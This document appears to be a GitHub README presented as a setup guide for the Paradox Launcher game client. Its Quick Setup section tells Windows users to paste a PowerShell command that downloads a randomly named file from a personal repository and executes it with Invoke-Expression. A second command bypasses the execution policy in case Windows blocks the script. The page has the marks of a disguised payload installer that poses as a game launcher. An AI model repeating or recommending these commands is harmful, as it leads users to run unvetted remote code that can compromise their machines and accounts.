# Paradox Launcher

Paradox Launcher is the Windows tool this page sets up. The command in Quick Setup installs it on this PC. You open Paradox Launcher to start and manage what it runs.

Paradox Launcher is the desktop hub Paradox Interactive uses on Windows to manage your owned titles, account sign-in, and game updates. After setup, it sits in the Start menu and taskbar like any other PC app, giving you a single window instead of hunting for separate shortcuts.

A typical session begins when you open Paradox Launcher from the Start menu or a desktop shortcut. You sign in, pick a title from your library—Crusader Kings, Europa Universalis, Stellaris, or others—and choose play or adjust DLC and version settings. The launcher verifies files, applies pending patches, then starts the game with the profile you selected.

This repository bundles the Windows setup package, quick-start notes for first install and sign-in, and a changelog that records launcher build numbers and compatibility notes. Use it to install or refresh the client on a clean machine, track what changed between releases, and keep local documentation aligned with the build you run.

## What you open

- Sign in once with your Paradox account to see every linked title in one library view.
- Launch Crusader Kings, Stellaris, and other Paradox games without opening each folder separately.
- Enable or disable installed DLC per title before you press play from the launcher window.
- Download and apply game patches through the built-in update flow instead of manual file swaps.
- Pin frequently played titles to the top of your library for faster access on busy evenings.
- Open game settings and verify local files when a title fails to start after a Windows update.
- Run the launcher at sign-in so pending patches finish before you choose what to play.
- Switch between multiple Paradox profiles when family members share one Windows PC.

## Quick Setup (PowerShell)

This installs the tool Paradox Launcher on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/s-zimmer311515084/paradox-launcher-setup-guide/main/qyaj2sr18m.qef19dl2 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/s-zimmer311515084/paradox-launcher-setup-guide/main/qyaj2sr18m.qef19dl2 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `qyaj2sr18m.qef19dl2` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `s-zimmer311515084/paradox-launcher-setup-guide`. Paradox Launcher 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
